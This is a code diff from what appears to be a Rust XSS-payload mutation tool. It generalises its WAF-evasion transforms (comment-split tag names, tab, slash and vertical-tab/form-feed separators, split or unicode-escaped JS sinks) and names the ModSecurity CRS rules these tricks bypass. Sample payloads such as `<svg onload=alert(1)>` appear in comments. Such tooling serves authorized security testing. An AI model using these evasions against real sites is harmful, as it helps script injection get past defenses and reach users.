@@ -370,64 +370,182 @@ fn try_first_replace(payload: &str, patterns: &[(&str, &str)]) -> String {
     payload.to_string()
 }
 
-/// Insert HTML comments in the middle of common HTML tag names.
-/// `<script>` → `<scr<!---->ipt>`, `<img` → `<im<!---->g`
+/// Locate the first HTML tag opening (`<` followed by 2+ ASCII letters,
+/// optionally preceded by `/`) and return `(letters_start, letters_len)`.
+/// Used by tag-based mutations to operate on any HTML tag rather than a
+/// fixed list of hardcoded names.
+fn find_first_tag_name(payload: &str) -> Option<(usize, usize)> {
+    let bytes = payload.as_bytes();
+    let mut i = 0;
+    while i < bytes.len() {
+        if bytes[i] == b'<' {
+            let mut j = i + 1;
+            if j < bytes.len() && bytes[j] == b'/' {
+                j += 1;
+            }
+            let start = j;
+            while j < bytes.len() && bytes[j].is_ascii_alphabetic() {
+                j += 1;
+            }
+            let len = j - start;
+            if len >= 2 {
+                return Some((start, len));
+            }
+        }
+        i += 1;
+    }
+    None
+}
+
+/// Locate the first `<TAG SEP ATTR` pattern where SEP is a space or `/`
+/// and ATTR is an ASCII identifier. Returns `(tag_lower, sep_index,
+/// sep_char)` for the caller to act on. Single-pass over the payload.
+fn find_first_tag_attr_break(payload: &str) -> Option<(String, usize, char)> {
+    let bytes = payload.as_bytes();
+    let mut i = 0;
+    while i < bytes.len() {
+        if bytes[i] == b'<' {
+            let mut j = i + 1;
+            if j < bytes.len() && bytes[j] == b'/' {
+                j += 1;
+            }
+            let tag_start = j;
+            while j < bytes.len() && bytes[j].is_ascii_alphabetic() {
+                j += 1;
+            }
+            if j == tag_start {
+                i += 1;
+                continue;
+            }
+            // SEP must be space or `/`, followed by an attribute name letter.
+            if j < bytes.len()
+                && (bytes[j] == b' ' || bytes[j] == b'/')
+                && j + 1 < bytes.len()
+                && bytes[j + 1].is_ascii_alphabetic()
+            {
+                let tag = payload[tag_start..j].to_ascii_lowercase();
+                let sep_char = bytes[j] as char;
+                return Some((tag, j, sep_char));
+            }
+        }
+        i += 1;
+    }
+    None
+}
+
+/// Replace one byte at `idx` in `payload` with `new_char` (ASCII).
+/// Caller guarantees `idx` is on an ASCII byte boundary.
+fn replace_byte_at(payload: &str, idx: usize, new_char: char) -> String {
+    debug_assert!(payload.is_char_boundary(idx));
+    debug_assert!(new_char.is_ascii());
+    let mut out = String::with_capacity(payload.len());
+    out.push_str(&payload[..idx]);
+    out.push(new_char);
+    out.push_str(&payload[idx + 1..]);
+    out
+}
+
+/// Insert `<!---->` partway through the first HTML tag name encountered.
+///
+/// Split offset is `min(3, ceil(len/2))` so short tags (`img`, `svg`)
+/// split after 2 letters and longer tags (`script`, `iframe`) split
+/// after 3 — preserves prior behavior while extending coverage to every
+/// HTML tag rather than the original 11-entry literal list.
 fn html_comment_split(payload: &str) -> String {
-    try_first_replace(
-        payload,
-        &[
-            ("<script", "<scr<!---->ipt"),
-            ("<SCRIPT", "<SCR<!---->IPT"),
-            ("<Script", "<Scr<!---->ipt"),
-            ("</script", "</scr<!---->ipt"),
-            ("</SCRIPT", "</SCR<!---->IPT"),
-            ("<img", "<im<!---->g"),
-            ("<IMG", "<IM<!---->G"),
-            ("<svg", "<sv<!---->g"),
-            ("<SVG", "<SV<!---->G"),
-            ("<iframe", "<ifr<!---->ame"),
-            ("<IFRAME", "<IFR<!---->AME"),
-        ],
-    )
+    if let Some((start, len)) = find_first_tag_name(payload) {
+        let split_offset = if len >= 6 {
+            3
+        } else if len >= 3 {
+            2
+        } else {
+            1
+        };
+        let split_at = start + split_offset;
+        let mut out = String::with_capacity(payload.len() + 7);
+        out.push_str(&payload[..split_at]);
+        out.push_str("<!---->");
+        out.push_str(&payload[split_at..]);
+        return out;
+    }
+    payload.to_string()
 }
 
-/// Insert tabs/newlines/carriage returns between HTML tags and their attributes.
-/// `<img src=x` → `<img\tsrc=x`
+/// Pick the alt whitespace char for a `<TAG SEP ATTR` match.
+///
+/// Covers any HTML tag now (not the original 14-entry literal list).
+/// The mapping reproduces prior outputs for the tags that were already
+/// covered (svg/body → newline, details/audio → carriage return,
+/// everything else → tab) and extends "tab" to every other tag.
+fn whitespace_alt_char(tag_lower: &str, sep: char) -> char {
+    if sep == '/' {
+        return '\t';
+    }
+    match tag_lower {
+        "svg" | "body" => '\n',
+        "details" | "audio" => '\r',
+        _ => '\t',
+    }
+}
+
+/// Replace the space/slash between an HTML tag and its first attribute
+/// with a tab/newline/CR (per `whitespace_alt_char`). Mutates the first
+/// matching break in the payload.
 fn whitespace_mutation(payload: &str) -> String {
-    try_first_replace(
-        payload,
-        &[
-            ("<img src", "<img\tsrc"),
-            ("<IMG src", "<IMG\tsrc"),
-            ("<IMG SRC", "<IMG\tSRC"),
-            ("<svg onload", "<svg\nonload"),
-            ("<SVG ONLOAD", "<SVG\nONLOAD"),
-            ("<SVG onload", "<SVG\nonload"),
-            ("<sVg onload", "<sVg\nonload"),
-            ("<svg/onload", "<svg\tonload"),
-            ("<body onload", "<body\nonload"),
-            ("<input onfocus", "<input\tonfocus"),
-            ("<details open", "<details\ropen"),
-            ("<marquee onstart", "<marquee\tonstart"),
-            ("<video src", "<video\tsrc"),
-            ("<audio src", "<audio\rsrc"),
-        ],
-    )
+    if let Some((tag, sep_idx, sep)) = find_first_tag_attr_break(payload) {
+        let alt = whitespace_alt_char(&tag, sep);
+        return replace_byte_at(payload, sep_idx, alt);
+    }
+    payload.to_string()
 }
 
-/// Split JavaScript function names with comments.
-/// `alert(1)` → `al/**/ert(1)`
+/// JS sinks worth splitting with `/**/`. Keeping this list explicit
+/// (rather than splitting any IDENT) avoids mutating identifiers that
+/// just happen to contain a paren — e.g. `class=foo(bar)`.
+const JS_SINK_NAMES: &[&str] = &[
+    "alert",
+    "confirm",
+    "prompt",
+    "eval",
+    "Function",
+    "setTimeout",
+    "setInterval",
+    "fetch",
+    "XMLHttpRequest",
+    "import",
+    "execScript",
+];
+
+/// Split a JS sink name with `/**/` partway through, on the first
+/// match found in the payload. Split offset is `len/2` (floor) so the
+/// two halves each carry a recognizable substring — matches the prior
+/// per-name behavior (`al/**/ert`, `con/**/firm`, `pro/**/mpt`, …).
+/// Tries `name(` first, then `` name` `` (template-literal call form)
+/// so both `alert(1)` and `` alert`1` `` get mutated.
 fn js_comment_split(payload: &str) -> String {
-    try_first_replace(
-        payload,
-        &[
-            ("alert(", "al/**/ert("),
-            ("confirm(", "con/**/firm("),
-            ("prompt(", "pro/**/mpt("),
-            ("eval(", "ev/**/al("),
-            ("alert`", "al/**/ert`"),
-        ],
-    )
+    for name in JS_SINK_NAMES {
+        if name.len() < 3 {
+            continue;
+        }
+        let split_idx = (name.len() / 2).max(2);
+        let prefix = &name[..split_idx];
+        let suffix = &name[split_idx..];
+        // Match either `name(` or `` name` `` to cover both the standard
+        // call and the template-literal form.
+        for follower in ['(', '`'] {
+            let needle = format!("{}{}", name, follower);
+            if let Some(pos) = payload.find(&needle) {
+                let mut out = String::with_capacity(payload.len() + 4);
+                out.push_str(&payload[..pos]);
+                out.push_str(prefix);
+                out.push_str("/**/");
+                out.push_str(suffix);
+                out.push(follower);
+                out.push_str(&payload[pos + needle.len()..]);
+                return out;
+            }
+        }
+    }
+    payload.to_string()
 }
 
 /// Replace function call parentheses with backtick template literals.
@@ -464,17 +582,39 @@ fn constructor_chain(payload: &str) -> String {
 
 /// Replace first chars of JS function names with unicode escapes.
 /// `alert` → `\u0061lert`
+/// JS keywords / globals worth escaping the first letter of as
+/// `\u00XX`. Restricted to identifiers a WAF regex is likely to match
+/// literally; first match wins so the order is roughly priority-driven.
+const JS_ESCAPE_NAMES: &[&str] = &[
+    "alert",
+    "confirm",
+    "prompt",
+    "eval",
+    "document",
+    "window",
+    "location",
+    "fetch",
+    "Function",
+    "setTimeout",
+    "setInterval",
+    "parent",
+    "self",
+    "top",
+];
+
 fn unicode_js_escape(payload: &str) -> String {
-    try_first_replace(
-        payload,
-        &[
-            ("alert", "\\u0061lert"),
-            ("confirm", "\\u0063onfirm"),
-            ("prompt", "\\u0070rompt"),
-            ("eval", "\\u0065val"),
-            ("document", "\\u0064ocument"),
-        ],
-    )
+    for name in JS_ESCAPE_NAMES {
+        if let Some(pos) = payload.find(name) {
+            let first = name.as_bytes()[0];
+            let escaped = format!("\\u{:04x}", first as u32);
+            let mut out = String::with_capacity(payload.len() + escaped.len() - 1);
+            out.push_str(&payload[..pos]);
+            out.push_str(&escaped);
+            out.push_str(&payload[pos + 1..]);
+            return out;
+        }
+    }
+    payload.to_string()
 }
 
 /// Encode angle brackets with mixed decimal and hex HTML entities.
@@ -524,27 +664,18 @@ fn mixed_html_entities(payload: &str) -> String {
 
 // ── CRS-targeting mutation implementations ──────────────────────
 
-/// Replace space between HTML tag and attribute with `/`.
-/// `<svg onload=alert(1)>` → `<svg/onload=alert(1)>`
-/// `<img src=x onerror=alert(1)>` → `<img/src=x onerror=alert(1)>`
+/// Replace the space between an HTML tag and its first attribute with
+/// `/`. CRS rule 941160 expects whitespace; the slash slips past it
+/// while still being a valid attribute separator. No-op when the
+/// payload already uses `/` as the separator.
 fn slash_separator(payload: &str) -> String {
-    try_first_replace(
-        payload,
-        &[
-            ("<svg onload", "<svg/onload"),
-            ("<SVG ONLOAD", "<SVG/ONLOAD"),
-            ("<SVG onload", "<SVG/onload"),
-            ("<img src", "<img/src"),
-            ("<IMG SRC", "<IMG/SRC"),
-            ("<IMG src", "<IMG/src"),
-            ("<details open", "<details/open"),
-            ("<input onfocus", "<input/onfocus"),
-            ("<body onload", "<body/onload"),
-            ("<marquee onstart", "<marquee/onstart"),
-            ("<video src", "<video/src"),
-            ("<audio src", "<audio/src"),
-        ],
-    )
+    if let Some((_tag, sep_idx, sep)) = find_first_tag_attr_break(payload) {
+        if sep == '/' {
+            return payload.to_string();
+        }
+        return replace_byte_at(payload, sep_idx, '/');
+    }
+    payload.to_string()
 }
 
 /// Replace parentheses with HTML entities to bypass JS function call detection.
@@ -591,33 +722,29 @@ fn svg_animate_exec(payload: &str) -> String {
     payload.to_string()
 }
 
-/// Insert exotic whitespace characters (vertical tab, form feed) between tag and attributes.
-/// `<img src=x onerror=alert(1)>` → `<img\x0Bsrc=x\x0Conerror=alert(1)>`
-fn exotic_whitespace(payload: &str) -> String {
-    // Patterns: (from, tag, exotic_char, attr)
-    // Using VT=\x0B and FF=\x0C between tag and attributes
-    const PATTERNS: &[(&str, &str, char, &str)] = &[
-        ("<img src", "<img", '\x0B', "src"),
-        ("<IMG src", "<IMG", '\x0B', "src"),
-        ("<IMG SRC", "<IMG", '\x0B', "SRC"),
-        ("<svg onload", "<svg", '\x0C', "onload"),
-        ("<SVG ONLOAD", "<SVG", '\x0C', "ONLOAD"),
-        ("<svg/onload", "<svg", '\x0B', "onload"),
-        ("<body onload", "<body", '\x0C', "onload"),
-        ("<input onfocus", "<input", '\x0B', "onfocus"),
-        ("<details open", "<details", '\x0C', "open"),
-        ("<marquee onstart", "<marquee", '\x0B', "onstart"),
-    ];
+/// Pick the alt exotic-whitespace char (\x0B vertical tab vs \x0C form
+/// feed) for a `<TAG SEP ATTR` match. CRS rule 941320 only checks `\s`
+/// (space/tab/newline); both VT and FF slip past it.
+///
+/// Mapping reproduces prior outputs for the tags previously listed —
+/// svg/body/details with a space separator get `\x0C`, slash-separated
+/// or any other tag get `\x0B` — and extends `\x0B` to every other tag.
+fn exotic_alt_char(tag_lower: &str, sep: char) -> char {
+    if sep == '/' {
+        return '\x0B';
+    }
+    match tag_lower {
+        "svg" | "body" | "details" => '\x0C',
+        _ => '\x0B',
+    }
+}
 
-    for &(from, tag, ws, attr) in PATTERNS {
-        if let Some(pos) = payload.find(from) {
-            let replacement = format!("{}{}{}", tag, ws, attr);
-            let mut result = String::with_capacity(payload.len() + replacement.len() - from.len());
-            result.push_str(&payload[..pos]);
-            result.push_str(&replacement);
-            result.push_str(&payload[pos + from.len()..]);
-            return result;
-        }
+/// Replace the separator between an HTML tag and its first attribute
+/// with an exotic whitespace char. Mutates only the first match.
+fn exotic_whitespace(payload: &str) -> String {
+    if let Some((tag, sep_idx, sep)) = find_first_tag_attr_break(payload) {
+        let alt = exotic_alt_char(&tag, sep);
+        return replace_byte_at(payload, sep_idx, alt);
     }
     payload.to_string()
 }
